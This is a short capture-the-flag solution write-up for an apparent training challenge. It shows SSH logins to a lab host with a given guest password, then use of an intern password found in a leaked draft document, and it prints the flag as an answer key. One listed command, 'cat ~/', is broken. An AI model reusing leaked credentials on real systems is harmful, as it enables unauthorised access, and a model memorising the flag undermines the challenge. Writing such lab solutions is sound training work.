# PoC — Challenge 01: Starting Point

**Flag:** `EPI{7H3_r34l_5h0W_I5_4b0u7_70_B3GIn}`
**Vulnerability:** Information disclosure via leaked internal document
**Access needed:** SSH as `guest`

---

## Vulnerability

An internal draft document was left accessible to the `guest` account. It contains credentials for the `intern` user.

---

## Steps to Reproduce

```bash
# 1. Connect as guest
ssh guest@ecorp.cyber.epitest.eu -p <PORT>
# password: Ec0rpSuP3rS3cur3P4ss

# 2. Find and read the leaked document
cat ~/

# Look for any .md, .txt, or document files in home dirs accessible to guest
# The document "Ecorp - Doc (Draft).md" leaks intern credentials:
#   intern / EC0rp1sGr34t

# 3. Connect as intern to confirm access
ssh intern@ecorp.cyber.epitest.eu -p <PORT>
# password: EC0rp1sGr34t

# 4. Read flag
cat ~/flag.txt
```

**Flag:** `EPI{7H3_r34l_5h0W_I5_4b0u7_70_B3GIn}`
